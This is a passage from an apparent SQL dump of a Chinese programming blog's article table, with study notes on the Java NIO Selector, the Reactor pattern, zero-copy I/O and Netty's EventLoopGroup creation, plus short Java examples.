keys*才会被从这个*selector*的所有**selectionKey set**（可能是**key set**、**selected-key set**、**cancelled-key set**）中移除，但是不会影响这些集合本身。\n4. 在 *selection operations* 期间，一些*selectionKey*会被选中添加到 **selected-key set** 中。其中的每个*key*可以通过*selectiedKeys.remove()*或*selectiedKeys.iterator().remove()*直接从 **selected-key set** 中移除，除此之外不能够通过任何方式被直接移除。特殊的，**selected-key set** 中的*keys*还可以在 **selection operations** 期间被间接移除。但是是不可以直接向 **selected-key set** 添加*key*的\n\n### selector如何选择就绪channel,内容来源jdk源码文档\n#### selection operation动作\n1. 每次 *selection operation* 期间， *keys*都可以从*selector*的 **selected-key set** 被添加或者移除，同时也可以从它的 **key set** 和 **cancelled-key sets** 被移除。 *selection operation* 可以被触发通过执行*selector.select()*，*selector.select(long)*，和*selector.selectNow()* 方法，并且这些方法涉及到以下三个步骤：\n2. *selection operations* 是否会阻塞等待一个或多个通道准备就绪，以及等待多长时间，这是*selector.select()*，*selector.select(long)*，和*selector.selectNow()*三种选择方法之间唯一的本质区别\n\n#### 第一个步骤\n1. 首先每个位于 **cancelled-key set** 中的*key*会从每个包含它的*key*集合中被移除，并且对应的*channel*会被撤销登记。这个步骤使得 **cancelled-key set** 变为空。\n\n#### 第二个步骤\n3. 查询底层操作系统来获得关于*selector*中剩余*channel*的*就续事件*从 *selection operation* 开始截止到此刻的更新情况，只要哪个*channel*的*就续事件的更新部分*有至少一个与*兴趣集*中的操作匹配上，那么将会执行以下两个动作：\n\n\n- 如果这个*channel\'s key* 没有存在 于 **selected-key set** 那么将它添加到这个集合中，并将它的*就绪操作集*(ready-operation set)修改成 *只包含*使得*channel*被报告就绪的操作，任何先前记录在*就绪操作集*中的就绪信息都会被丢弃。\n- 否则，如果这个*channel\'s key* 存在 于 **selected-key set** ，那么就保留*就绪操作集*中先前的就绪信息，并将这些 使得*channel*被*报告就绪*的操作 写入进去；总而言之，系统底层会通过*按位与&操作*更新当前就绪集。\n- 如果这些*Key*的*兴趣集*为空，那么 **selected-key set** 和 keys’的*就续集*(ready-operation sets)都不会被更新。\n\n#### 第三个步骤\n1. 如果在步骤（2）正在进行时将任何key添加到 cancelled-key set，则按步骤（1）处理它们。\n\n### selector线程安全吗,内容来源jdk源码文档\n1. 多线程并发情况下*Selectors*本身是线程安全的，但是他们所持有的*key sets*不是线程安全的\n2. *selection operations* 按顺序在*selector*本身，**key set** 和 **selected-key set** 上同步。 它们还在上面的步骤（1）和（3）期间在 **canceled-key set** 上同步。\n3. 在 *selection operations* 期间改变*key*的*兴趣集*，对于本次操作将不会产生任何影响；它们的影响将会再下次 *selection operations* 期间发生\n4. *selectionKey*可能会被取消，*channel*可能随时关闭。 因此，在一个或多个选择器的*key集*中存在并不意味着*selectionKey*有效或其*channel*是开放的。有可能另一个线程取消*selectionKey*或关闭一个*channel*，应用程序代码应该小心地同步并检查这些条件。\n5. *selector.close()* 在 *selection operations* 期间会顺序的同步*selector 和 它的三个key set*\n6. 一个*selector*的 **key set** 和 **selected-key set** 通常情况下是线程不安全的。如果一个线程想要修改这个集合，需要同步控制它。通过*key集合*的*iterator()*方法返回的*Iterators*提供了*快速失败*（fail-fast）：如果在创建迭代器之后修改了set，除了通过调用迭代器自己的*remove()* 方法之外，将抛出ConcurrentModificationException\n\n#### 中断阻塞\n1. 一个线程通过selector.select()或selector.select(long)方法产生的阻塞可以被其他线程用以下三种方式的任意一种来中断\n2. 调用*selector*的*wakeup()*方法\n3. 调用*selector*的*close()*方法\n4. 调用被阻塞线程的*interrupt()*方法,在这种情况下,它的中断状态将被设置,并且将调用*selector*的*wakeup()*方法。\n\n### SelectionKey\n注册Selector会返回一个SelectionKey对象，\n这个对象包含了如下内容\n1. interest set,当前Channel感兴趣的事件集，即在调用register方法设置的interes set\n2. ready set\n3. channel\n4. selector\n5. attached object，可选的附加对象\n\n#### interest set\n```java\n// 可以通过SelectionKey类中的方法来获取和设置interes set\n// 返回当前感兴趣的事件列表\nint interestSet = key.interestOps();\n\n// 也可通过interestSet判断其中包含的事件\nboolean isInterestedInAccept  = interestSet & SelectionKey.OP_ACCEPT;// 服务端接收客户端连接的事件，一般为创建ServerSocketChannel服务端channel；值为：1<<4 \nboolean isInterestedInConnect = interestSet & SelectionKey.OP_CONNECT;// 客户端连接服务端的事件(tcp连接)，一般为创建SocketChannel客户端channel；值为：1<<3 \nboolean isInterestedInRead    = interestSet & SelectionKey.OP_READ;// 可读事件；值为：1<<0\nboolean isInterestedInWrite   = interestSet & SelectionKey.OP_WRITE;// 可写事件；值为：1<<2\n\n// 各事件分别在什么条件下就绪\nOP_ACCEPT:客户端向服务端发起TCP连接建立【服务端的代码监听】\nOP_CONNECT:客户端与服务端的连接建立成功或失败【客户端代码监听】\nOP_READ:客户端向服务端发请求或服务端向客户端写入数据时\nOP_WRITE:判断缓冲区是否有空闲空间\n\n// 可以通过interestOps(int ops)方法修改事件列表\nkey.interestOps(interestSet | SelectionKey.OP_WRITE);\n```\n\n#### ready set\n```java\n// 当前Channel就绪的事件列表\nint readySet = key.readyOps();\n\n// 也可通过四个方法来分别判断不同事件是否就绪\nkey.isReadable();    //读事件是否就绪\nkey.isWritable();    //写事件是否就绪\nkey.isConnectable(); //客户端连接事件是否就绪\nkey.isAcceptable();  //服务端连接事件是否就绪\n```\n#### channel和selector\n```java\n// 我们可以通过SelectionKey来获取当前的channel和selector\n// 返回当前事件关联的通道，可转换的选项包括:`ServerSocketChannel`和`SocketChannel`\nChannel channel = key.channel();\n\n//返回当前事件所关联的Selector对象\nSelector selector = key.selector();\n```\n#### attached object\n```java\n// 我们可以在selectionKey中附加一个对象:\nkey.attach(theObject);\nObject attachedObj = key.attachment();\n// 或者在注册时直接附加:\nSelectionKey key = channel.register(selector, SelectionKey.OP_READ, theObject);\n```\n\n### Selector类中方法\n1. open():创建一个Selector对象\n2. isOpen():是否是open状态，如果调用了*close()*方法则会返回*false*\n3. provider():获取当前Selector的*Provider*\n4. keys():如上文所述，获取当前channel注册在Selector上所有的key\n5. selectedKeys():获取当前channel就绪的事件列表\n6. selectNow():获取当前是否有事件就绪，该方法立即返回结果，不会阻塞；如果返回值>0，则代表存在一个或多个\n7. select(long timeout):selectNow的阻塞超时方法，超时时间内，有事件就绪时才会返回；否则超过时间也会返回\n8. select():selectNow的阻塞方法，直到有事件就绪时才会返回\n9. wakeup():调用该方法会时，阻塞在*select()*处的线程会立马返回；(ps：下面一句划重点)即使当前不存在线程阻塞在*select()*处，那么下一个执行*select()*方法的线程也会立即返回结果，相当于执行了一次*selectNow()*方法\n10. close(): 用完*Selector*后调用其*close()*方法会关闭该*Selector*，且使注册到该*Selector*上的所有*SelectionKey*实例无效。channel本身并不会关闭', 0, 0, 27, 0, 0, '2019-09-04 20:11:46', '2019-09-04 22:21:28', 0, 0);
INSERT INTO `article` VALUES (77, 1, 'Reactor模式基本概念角色', '2019/9/1567607173_mmexport1567588224177.jpg', '### Reactor模式是什么\n1. Reactor模式也叫反应器模式，大多数IO相关组件如Netty、Redis在使用的IO模式\n2. 较于传统模式,极大的提高了可用性与性能\n\n### 基本网络服务流程\n1. webService,分布式对象等等,对于不同的网络服务,大多数都有基本的结构\n1. *Read request*-读请求\n2. *Decode request*-解码请求\n3. *Process service*-处理服务\n4. *Encode reply*-编码响应\n5. *Send reply*-发送响应\n6. 但是这个流程的每一步,它们的成本都是不一样的,在xml解析,文件传送,网页生成,计算服务等方面\n\n### 经典传统服务器设计\n#### 图示\n![ClassicServiceDesigns.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568266574_ClassicServiceDesigns.png) \n#### 代码示例\n```java\nclass Server implements Runnable {\n    public void run() {\n        try {\n            ServerSocket ss = new ServerSocket(PORT);\n            while (!Thread.interrupted())\n                new Thread(new Handler(ss.accept())).start();\n            // or, single-threaded, or a thread pool\n        } catch (IOException ex) { /* ... */ }\n    }\n    static class Handler implements Runnable {\n        final Socket socket;\n        Handler(Socket s) { socket = s; }\n        public void run() {\n            try {\n                byte[] input = new byte[MAX_INPUT];\n                socket.getInputStream().read(input);\n                byte[] output = process(input);\n                socket.getOutputStream().write(output);\n            } catch (IOException ex) { /* ... */ }\n        }\n        private byte[] process(byte[] cmd) { /* ... */}\n    }\n} \nNote: most exception handling elided from code examples\n```\n#### 出现的问题\n1. 线程太多了,每一个连接都会产生一个线程,如果连接数特别特别大的话,如果连接数达到了1w,那么服务端就要产生1w个线程,那这么成本就极高了\n2. 经过一些基准测试发现在一台机器上,如果线程持续的上升,到达一个临界点之后,整个性能就急剧下降,因为线程与线程之间的切换是比较耗费资源的,同时,每一个系统,它承载的最大线程数实际上是有限制的\n3. 这种方式适合处理量不大的一些网络业务\n\n#### 需要达成可伸缩性的目标\n1. 在负载增加下优雅降级(更多的客户端进行连接时)\n2. 随着增加资源持续改进(CPU,内存,硬盘,带宽)\n3. 满足可用性和性能目标\n	1. 更短的延迟\n	2. 满足高峰需求\n	3. 可调节的服务质量\n4. 分而治之(Divide-and-conque)通常是最好的,对于实现任何可伸缩性目标的方法	\n\n#### 如何分而治之\n1. 将处理分为小任务,每个任务执行一个操作而不会阻塞(handler中的read,decode,..)\n2. 当可用的时候执行每项任务,这里,IO事件通常用作触发器实现的\n3. java.nio中支持的基本机制\n	1. 非阻塞读写\n	2. 调度与感测到的IO事件相关的任务\n4. 一系列事件驱动(event-driven designs)的设计可以解决这类问题\n\n### IO事件驱动方式\n#### 事件驱动的特点\n1. 通常比替代品更有效 \n	1. 资源减少,通常不需要每个客户端一个线程\n	2. 减少开销,减少CPU上下文切换,通常减少锁\n	3. 但调度分发可能会更慢,必须手动将动作绑定到事件\n2. 通常难以编程\n	1. 必须分解为简单的非阻塞动,与GUI事件驱动的动作类似(比如按钮点击),无法消除所有阻塞：GC,页面错误等等\n	2. 必须跟踪逻辑服务状态,因为是异步的,执行此操作时,系统调到另一个任务怎么让前一个任务完成之后对于它的结果某些变量修改,怎么能让下一个步骤能接收到\n\n#### AWT中的事件驱动\n![ClassicServiceDesigns.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568266575_eventdriven.png) \n1. IO事件驱动使用类似的想法,但在设计上是完全不同的	\n\n#### Reactor的事件驱动\n1. Reactor通过调度适当的处理程序进行响应IO事件\n		· 与AWT线程类似\n2. 处理程序执行非阻塞操作\n		· 与AWT ActionListeners类似\n3. 通过将处理程序绑定到事件来管理\n		· 与AWT addActionListene类似\n\n\n### Reactor模式\n![reactor.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568271826_reactor.png)\n#### Reactor模式的角色构成(Reactor模式一共有5种角色构成)\n1. *Handler*(句柄或是描述符): 本质上表示一种资源,是由操作系统提供的;该资源用于表示一个个的事件,比如说文件描述符,或是针对网络编程中的socket描述符.事件既可以来自外部,也可以来自于内部;外部事件比如说客户端的连接请求,客户端发送过来数据等;内部事件比如说操作系统产生的定时器事件等.它本质上就是一个文件描述符.*Handler是事件产生的发源地*\n2. *Synchronous Event Demultiplexer*(同步事件分离器): 它本身是一个系统调用,用于等待事件的发生(事件可能是一个,也可能是多个).调用方在调用它的时候会被阻塞,一直阻塞到同步时间分离器上有事件产生为止.对于linux来说,同步事件分离器指的就是常用的I/O多路复用,比如说select,poll,epoll等.在Java NIO领域中,同步事件分离器对应的组件就是Selector;对应的阻塞方法就是select方法\n3. *Initiation Dispatcher*(初始分发器):实际上就是Reactor角色,它本身定义了一些规范,这些规范用于控制事件的调度方式,同时又提供了应用进行事件处理器的注册,删除等设施,它本身是整个事件处理器的核心所在,InitiationDispatcher会通过同步事件分离器来等待事件的发生。一旦事件发生,Initiation Dispatcher首先会先分离出每一个事件,然后调用事件处理器,最后调用相关的回调方法来处理这些事件\n4. *EventHandler*(事件处理器): 本身由多个回调方法构成,这些回调方法构成了与应用相关的对于某个事件的反馈机制,Netty相比于Java NIO来说,在事件处理器这个角色上进行了一个升级,它为我们开发者提供了大量的回调方法,供我们在特定事件产生时实现相应的回调方法进行业务逻辑的处理. \n5. *Concrete Event Handler*(具体事件处理器):是事件处理器的实现,它本身实现了事件处理器所提供的各个回调方法,从而实现了特定于业务的逻辑.它本质上就是netty中我们所编写的一个个的处理器实现.\n\n#### Reactor模式的流程\n1. 当应用向*InitiationDispatcher*注册具体的事件处理器时,应用会标识出该事件处理器希望*InitiationDispatcher*在某个事件发生时向其通知的该事件,该事件与Handle关联\n2. *InitiationDispatcher*会要求每个事件处理器向其传递内部的Handler,该Handler向操作系统标识了事件处理器.\n3. 当所有的事件处理器注册完毕后,应用会调用*InitiationDispatcher*的handle_event方法来启动*InitiationDispatcher*的事件循环,这时,*InitiationDispatcher*会将每个注册的事件管理器的Handle合并起来,并使用同步事件分离器等待这些事件的发生.比如说,TCP协议层会使用select同步事件分离器操作来等待客户端发送的数据到达连接的socketHandler上\n4. 当与某个事件源对应的Handle变为ready状态时(比如说,TCP socket变为等待读状态时),同步事件分离器就会知道 *InitiationDispatcher*\n5. *InitiationDispatcher*会触发事件处理器的回调方法,从而响应这个处于ready状态的Handle。当事件发生时,*InitiationDispatcher*会将被事件源激活的Handler作为 Key 来寻找并分发恰当的事件处理器回调方法\n6. *InitiationDispatcher*会回调事件处理器的handle_event回调方法来执行特定于应用的功能(开发者自己所编写的功能),从而响应这个事件,所发生的事件类型可以作为该方法参数并被该方法内部使用来执行额外的特定于服务的分离与分发.\n\n#### 换一种说法\n1. 在初始化*InitiationDispatcher*之后,将若干个*ConcreteEventHandler*注册到其上,\n2. 由于*ConcreteEventHandler*会拥有handler,再注册的同时就会指定某一个事件处理器它感兴趣的事件到底是什么(*SectionKey*),\n3. 当注册handler完成后,*InitiationDispatcher*就会事件循环启动\n4. 启动完事件循环之后,同步事件分离器的select()等待着事件的产生\n5. 当有事件产生的时候(若干个),同步事件分离器会获取所产生的那些事件,并给*InitiationDispatcher*这些事件\n6. *InitiationDispatcher*根据这些事件,寻找到与这个事件有关联的那一系列handler,*遍历handler*,根据感兴趣事件的类型再去调用*Concrete Event Handler*当中的handle_event方法,至此事件循环结束了\n\n### 多线程的Reactor模式\n#### 图示\n![multithreadedReactor.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568271825_multithreadedReactor.png)\n#### Reactor模式中担任的角色\n1. *Client*: 担任相当于**Handler**(句柄或是描述符),Handler是事件产生的发源地,包含了事件类型\n2. *MainReactor,Acceptor,SubReactor*: 担任了相当于**Initiation Dispatcher**,实际上就是**Reactor**角色,*InitiationDispatcher*会通过**SynchronousEventDemultiplexer同步事件分离器(在JavaNIO中就是selector.select())**来等待事件的发生。一旦事件发生,Initiation Dispatcher首先会先分离出每一个事件,然后调用事件处理器,最后调用相关的回调方法来处理这些事件\n3. *queuedTask*: 相当于担任了**Concrete Event Handler**,是事件处理器的实现.它本身实现了事件处理器所提供的各个回调方法,从而实现了特定于业务的逻辑.它本质上就是我们所编写的一个个的处理器实现.\n\n#### 为什么使用两个Reactor角色,acceptor是什么\n1. 一个是mainReactor（bossGroup/parentGroup）用于参数接收请求,不做任何事情处理\n2. 一个是subReactor（workGroup/childrenGroup）用于参数对要实现对象处理\n3. acceptor是mainReactor与subReactor之间交互的桥梁和纽带\n\n#### Worker Threads\n1. 移交非IO处理以加快反应器线程速度,与POSA2 Proactor设计类似\n2. 比重新计算绑定更简单,处理成事件驱动的形式,应该仍然是纯粹的非阻塞计算,足够的处理来超过开销\n3. 但更难以与IO重叠处理,最好可以先将所有输入读入缓冲区\n4. 使用线程池，因此可以调整和控制,通常需要比客户端少得多的线程\n5. 多个反应器线程,反应器线程可以使IO完全饱和,将负载分配给其他反应器,负载平衡以匹配CPU和IO速率\n6. netty大致部分基于此Reactor多线程模式进行编写,所以说Netty整体架构是Reactor模式的完整体现\n\n> 参考文献http://www.dre.vanderbilt.edu/~schmidt/PDF/reactor-siemens.pdf \nhttp://gee.cs.oswego.edu/dl/cpjslides/nio.pdf', 1, 0, 46, 0, 0, '2019-09-04 22:26:24', '2019-09-12 15:27:49', 0, 0);
INSERT INTO `article` VALUES (78, 1, '零拷贝概念与底层过程', '2019/9/1567662235_mmexport1567598161709.jpg', '### 概念\n#### 关于零拷贝基础的知识\n1. 操作系统空间分为**user space(用户空间)**和**kernel space(内核空间)**,因此在进行应用程序与操作系统之间需要经过上下文的切换\n2. 零拷贝*依赖于操作系统*的,对于应用程序来说完全无法干涉实现零拷贝,大部分操作系统都有着零拷贝的实现支持\n3. 零拷贝所带来的效率提升是巨大的,非常非常值得进行应用\n\n#### 零拷贝是什么\n1. 零拷贝技术可以减少数据拷贝和共享总线操作的次数，*消除传输数据在存储器之间不必要的中间拷贝次数*，从而有效地提高数据传输效率\n2. 零拷贝技术减少了**用户应用程序地址空间**和**操作系统内核地址空间**之间因为上下文切换而带来的开销\n3. 进行大量的数据拷贝操作其实是一件简单的任务，从操作系统的角度来说，如果 CPU 一直被占用着去执行这项简单的任务，那么这将会是很浪费资源的；如果有其他比较简单的系统部件可以代劳这件事情，从而使得 CPU 解脱出来可以做别的事情，那么系统资源的利用则会更加有效\n\n### 代码范例展现使用与不使用零拷贝的差距\n#### 不使用零拷贝\n![nousezerocopy.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1567664245_nousezerocopy.png)\n\n#### 使用零拷贝\n![usezerocopy.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1567664245_usezerocopy.png)\n\n#### 使用与不使用差距\n1. 在不使用零拷贝方式,用传统IO的stream对文件进行读取并传输,耗时量达到了1178\n2. 在使用零拷贝方式,用NIO提供的零拷贝相关API对文件进行读取并传输,耗时量仅仅只有175\n3. 在windows系统下,这种差距有六倍多,这种差距是非常大的\n\n### 传统方式,也就是不使用零拷贝的第一个代码示范过程\n![zerocopy1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1567672946_zerocopy1.png)\n#### 过程步骤\n1. **用户空间**调用*读系统调用*(read() syscall)发给**内核空间**,紧接着进行第一次空间切换\n2. **内核空间**上向硬件磁盘去发出*读取数据*(ask for data)操作\n3. 数据将会被读取拷贝到**内核空间的buffer**中,这个拷贝过程通过叫做*直接内存访问*(DMA)的方式进行\n4. 随后,将**内核空间的buffer**的内容原封不动的拷贝到了**用户空间的buffer**当中,这是发生的第一次拷贝以及第二次空间切换\n5. 执行我们的业务代码\n6. **用户空间**调用*写系统调用*(write() syscall)拷贝数据发给**内核空间的buffer**当中(这个buffer与之前buffer不是一个),这是第二次拷贝以及第三次空间切换\n7. **内核空间的buffer**需要将数据原封不动的将数据拷贝至**socket buffer**当中,这是第三次拷贝\n8. **内核空间**向**协议引擎**发出请求\n9. **协议引擎**接收并从**socket buffer**当中的数据发送给网络\n10. done完成操作后,从**内核空间**返回write方法至**用户空间**,这是第四次空间切换\n\n#### 什么是空间转换\n1. 指的是从**用户空间**调用移动至**内核空间**或**内核空间**调用移动至**用户空间**的一次过程会造成操作系统的上下文模式切换\n2. 对于操作系统来说希望将用户空间与内核空间进行隔开\n\n#### 为什么要将kernel buffer拷贝至socket buffer,而不是直接使用kernel buffer\n1. **协议引擎需**要从**socket buffer**读取数据发送至网络,并且它不知道**kernel buffer**是谁创建的,它的位置在哪里\n2. 这是真正零拷贝实现方式重要的地方\n\n#### 缺陷\n1. 途中经历了*三次数据拷贝与四次空间切换*,这种频繁的拷贝与空间上下文切换使得效率极差\n\n### 传统方式的改善\n![zerocopy2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1567672947_zerocopy2.png)\n#### 过程步骤\n1. **用户空间**发出*sendfile*系统调用(sendfile() syscall)\n2. **内核空间**向硬件磁盘发出读取数据的请求\n3. 直接内存访问机制读取磁盘上的文件,把它读取到**内核空间的buffer**当中\n4. 将**内核空间的buffer**写入到将要发送的**socket buffer**当中\n5. **内核空间**向**协议引擎**发出请求\n6. **协议引擎**接收并从**socket buffer**当中的数据发送给网络\n7. done完成操作后,从**内核空间**返回write方法至**用户空间**\n\n#### 相比传统方式\n1. 它只存在*一次拷贝*,**kernel buffer**拷贝至**socket buffer**时\n2. 它只存在*两次空间切换*,*sendfile syscall*时与*sendfile returns*时\n3. 相比传统方式做到了极大的改进\n\n#### 用户空间似乎无法参与过程\n1. 在这个零拷贝的过程中,后续的所有操作都在内核空间,整个过程当中用户是没法参与到过程当中,用户需要参与怎么办\n2. 这种时候会用到**内存映射缓冲**,将操作系统磁盘上的文件内容映射到内存当中,修改内存就表示最终会修改磁盘上的文件,通过这种方式加以实现的\n\n#### 内存映射文件\n1. 它可以通过代码方式,将文件映射到**内核空间**当中,然后直接的去访问它,访问它就像在**用户空间**访问它一样\n2. 这个文件本身是映射到**内核空间**了,然而应用程序是可以直接访问它,这样也可以减少不必要的内存拷贝\n3. 通常情况下,我们要想去修改或者去访问文件,必须在**用户空间**下进行,但是现在将文件映射到**内核空间**里面,我可以让程序直接去访问**内核空间**里的文件,就好像这个文件是在**用户空间**一样,底层操作系统会提供这样的支持\n4. Java中*MappedByteBuffer*提供内存映射文件\n\n### 真正零拷贝方案\n![zerocopy3.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1567676046_zerocopy3.png)\n#### 过程步骤\n1. **用户空间**发出*sendfile*系统调用(sendfile() syscall)\n2. **内核空间**向硬件磁盘发出读取数据的请求\n3. 直接内存访问机制(DMA)读取磁盘上的文件,把它读取到**内核空间的buffer**当中\n4. 将**kernel buffer**中的文件相关信息(如: Kernelbuffer在磁盘的位置,它的长度是多少)的*文件描述符*(filedescriptor)这些少量信息放入**socket buffer**当中\n5. **内核空间**向**协议引擎**发出请求\n6. **协议引擎**会真正完成数据的发送,从**socket buffer**中读取*文件描述符*信息\n,协议引擎确定好位置和长度之后,协议引擎直接的把**kernelbuffer**的数据发送给对应的网络\n7. done完成操作后,从**内核空间**返回write方法至**用户空间**\n\n#### 文件描述符\n1. 内核空间向硬件磁盘发出请求数据,数据通过直接内存访问读到内核空间缓冲区当中,或者通过scatter/gather这种方式读取缓存去当中,需要底层操作系统提供支持\n1. 对于这么一种方式,需要底层操作系统提供相应支持,另外在内核空间层面,如果对于某一些机制,增加了filedescriptor文件描述符,那么它在文件描述符里面可以描述这个文件的内存空间,长度等等特性,通过这种方式也可以减少在内核空间的复制过程\n2. 对socketBuffer来说,它通过之前的filedescriptor可以能够探测到内核空间的缓冲区,它里面的数据是什么情况,就不需要复制,这只需要一次性的复制就可以完成所有的操作\n3. 这种才是真正意义上的零拷贝,数据仅仅是从磁盘上读取到了kernel buffer中,而后直接从内存缓冲区发送给对应的服务端', 0, 0, 47, 0, 0, '2019-09-05 13:44:04', '2019-09-05 18:04:20', 0, 0);
INSERT INTO `article` VALUES (79, 1, 'Netty的EventLoopGroup创建过程', '2019/9/1568276290_mmexport1568273999714.jpg', '### EventLoopGroup与Executor\n#### EventLoopGroup是什么\n1. 事件循环组,*NioEventLoopGroup*就是Nio异步循环组,底层就是一个死循环,它们不停地去侦测底层输入输出的事件,对事件进行处理,处理完之后进行任务的执行\n2. *EventLoopGroup*本身是一种特殊EventExecutorGroup,它的作用,在事件循环当中(连接建立,输入数据的到来等等),它会在事件循环的过程当中在进行**selector**选择的时候,可以去让它*注册channel*(客户端的连接)\n3. 作为多线程**Reactor**模式中的*Initiation Dispatcher*(初始分发器):实际上就是Reactor角色,它本身定义了一些规范,这些规范用于控制事件的调度方式,同时又提供了应用进行事件处理器的注册,删除等设施,它本身是整个事件处理器的核心所在,*InitiationDispatcher*会通过*同步事件分离器(JavaNIO的selector中的select()方法)*来等待事件的发生。一旦事件发生,*Initiation Dispatcher*首先会先分离出每一个事件,然后调用事件处理器,最后调用相关的回调方法来处理这些事件\n4. *EventLoopGroup的父类EventExecutorGroup*通过它的next方法负责提供*EventExecutor执行器*来进行使用。除此之外,它还负责处理EventLoop的生命周期\n\n#### Executor是什么\n1. 它便是EventLoopGroup中的*每个EventLoop对象*\n2. 它的实现类有许多,例如*EventExecutor*\n2. 本身是一个对象,这个对象本身它会执行所提交过来的*runnable*任务,,这个接口提供了一种方式,将任务的提交和运行这两件事情给解耦,这包括线程使用的细节,线程的调度等等信息.对于任务集合里的每一个任务来说,我们通常会使用executor,而没有必要去显式new Thread(new (RunnableTask())).start()\n3. Executor的execute(Runnable command): 在未来某一刻时间执行给定的命令,命令可能会在新的线程里面执行,也可能在一个线程池里面执行,或者说在调用者里面执行,那么到底这几种情况如何发生呢,由Executor实现来决定\n\n### EventLoopGrooup获取NIO的selectorProvider\n![eventloopselectorprovider1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568286369_eventloopselectorprovider1.png)\n1. netty是基于NIO的*selector*,selectorProvider是selector的提供者\n2. selector它本身是一个系统调用,用于等待事件的发生(事件可能是一个,也可能是多个).调用方在调用它的时候会被阻塞,一直阻塞到同步时间分离器上有事件产生为止,Selector中对应的阻塞方法就是select方法,在Reactor模式中该角色被称为SynchronousEventDemultiplexer(同步事件分离器)\n\n### EventLoopGroup创建select策略对象\n![eventLoopGroupSelectStrategy.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568299032_eventLoopGroupSelectStrategy.png)\n![eventLoopGroupSelectStrategy2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568297911_eventLoopGroupSelectStrategy2.png)\n1. EventLoopGroup在构造时获取一个select策略对象\n2. 在EventLoop循环处理时,将会根据selection operation过程中准备操作的selectionKeys与当前EventLoop是否存在对象为依据,决定采用的逻辑操作\n\n### EventLoopGroup创建RejectedExecutionHandler\n![eventLoopGroupRejectedExecutionHandler.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568298495_eventLoopGroupRejectedExecutionHandler.png)\n![eventLoopGroupRejectedExectuionHandler2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568298495_eventLoopGroupRejectedExectuionHandler2.png)\n![eventLoopGroupRejectedExecutionHandle3.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568298495_eventLoopGroupRejectedExecutionHandle3.png)\n1. 当Executor已经关闭（即执行了executorService.shutdown()方法后），并且Executor将有限边界用于最大线程和工作队列容量，且已经饱和时，在方法execute()中提交的新任务将被拒绝.将会调用reject方法\n\n\n### EventLoopGroup的创建EventLoop默认的数量\n![eventloopDefaultThreadCount1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568286368_eventloopDefaultThreadCount1.png)\n![eventloopDefaultThreadCount2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568286369_eventloopDefaultThreadCount2.png)\n1. 线程默认值是,先检查系统有没有io.netty.eventLoopThreads这个属性值,没有就取系统核心数*2\n2. 因为超线程技术,4核可能会有8线程,比如i7 6700K是四核八线程,那么netty取的值就是8*2=16\n\n### EventLoopGroup的负载均衡选择器\n![eventloopLoadbalancing1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568286369_eventloopLoadbalancing1.png)\n![eventloopLoadbalancing2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568286369_eventloopLoadbalancing2.png)\n![eventloopLoadbalancing3.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568286369_eventloopLoadbalancing3.png)\n1. EventLoop next(): 返回当前eventLoopGroup里的下一个要使用的eventLoop\n2. eventloopGroup调用的便是所创建的选择器的next()\n3. 负载均衡的选择器,针对于eventExecutor选择,如果是2的次数,那么将会优化\n\n### EventLoopGroup获取线程工厂\n![eventloopthreadfactory.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568286369_eventloopthreadfactory.png)\n![eventloopThreadFactory2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568286369_eventloopThreadFactory2.png)\n1. ThreadFactory使得将要执行的任务扔给线程,通过这种方式使得线程本身的创建和线程要执行的任务的定义给解耦,这使得应用可以去使用特殊的线程子类,优先级等等\n2. Executors#defaultThreadFactory方法会提供一个更加有用更简单的实现,它会设置所创建线程的上下文,在将这个所创建的线程返回之前,会将所创建线程的上下文设定为一些已知的值\n3. Thread newThread(Runnable r): 构建了一个新的线程,实现还可以初始化线程优先级,线程名字,线程是否是后台线程,线程组等等\n\n### EventLoopGroup创建EventLoop\n![eventLoopGroupNewChild1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568291337_eventLoopGroupNewChild1.png)\n![eventLoopGroupNewChild2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568291338_eventLoopGroupNewChild2.png)\n![eventLoopGroupNewChild3.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568291338_eventLoopGroupNewChild3.png)\n![eventLoopGroupnewChild4.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568291338_eventLoopGroupnewChild4.png)\n1. 在NioEventLoopGroup的父类*MultithreadEventExecutorGroup*的构造方法中遍历创建Executor,如果构造失败, 就清理资源\n2. 在NioEventLoopGroup中具体实现了newChild的方法,创建每一个NioEventLoop\n3. NioEventLoop创建时,使用传递的SelectorProvider获取一个对应的select,*这证明NioEventLoopGroup中的每一个NioEventLoop都持有一个对应的selector*\n4. 创建后对selector的selectionKeys进行了优化,由于是native方法实现,无法追其源代码\n\n### EventLoop创建对应的线程\n![eventLoopGroupChildThread1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568296780_eventLoopGroupChildThread1.png)\n![eventLoopGroupChildThread2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568296781_eventLoopGroupChildThread2.png)\n![eventLoopGroupChildThread3.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568296781_eventLoopGroupChildThread3.png)\n1. NioEventLoop间接继承SingleThreadEventExecutor,这证明每一个NioEventLoop持有一个对应的thread对象\n2. 在doStartThread()中获取了执行线程\n3. 这个thread就是eventLoop处理I/O事件的IO线程\n\n### 